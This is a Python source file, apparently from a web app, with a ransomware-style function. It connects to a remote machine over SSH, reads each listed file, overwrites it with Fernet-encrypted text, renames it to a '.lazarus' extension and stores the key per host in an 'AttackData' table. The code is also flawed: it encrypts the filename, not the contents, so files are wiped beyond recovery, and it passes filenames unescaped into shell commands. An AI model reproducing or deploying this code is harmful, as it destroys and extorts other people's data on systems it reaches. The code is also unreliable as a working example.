from cryptography.fernet import Fernet
from exeapp.models import AttackData
import paramiko
from exeapp.SSH_Paramiko import ssh_connector




def encryption(file_list,encrypt_key,hostname,port,username,password):


    ssh = ssh_connector(hostname,port,username,password)
    key = encrypt_key
    
    # using the generated key
    fernet = Fernet(key)
    
    filesize=0
    try:
        # Connect to the remote server
        ssh.connect(hostname, port, username, password)
        for filename in file_list:
            print(filename)
            stdin, stdout, stderr = ssh.exec_command(f"stat -c %s {filename}")

            filesize = stdout.read().decode()
            print(filesize)

            stdin, stdout, stderr = ssh.exec_command(f"cat {filename}")
            file_content = stdout.read().decode()

            


            # if the systemname is already in database
            if AttackData.objects.filter(SystemName = hostname).first():
                fernet = Fernet(AttackData.objects.filter(SystemName = hostname).first().EncryptionKey)
            
            # encrypting the file
            encrypted_content = fernet.encrypt(filename.encode())

            

            # opening the file in write mode and
            # writing the encrypted data
            new_file = filename.split('.')[0]+'.lazarus'
            ssh.exec_command(f"echo '{encrypted_content.decode()}' > {filename}")
            ssh.exec_command(f"mv {filename} {new_file}" )
            
        return filesize
    
    except paramiko.AuthenticationException:
        print("Authentication failed, please check your credentials")
    except paramiko.SSHException as e:
        print(f"SSH connection failed: {str(e)}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        # Close the SSH connection
        ssh.close()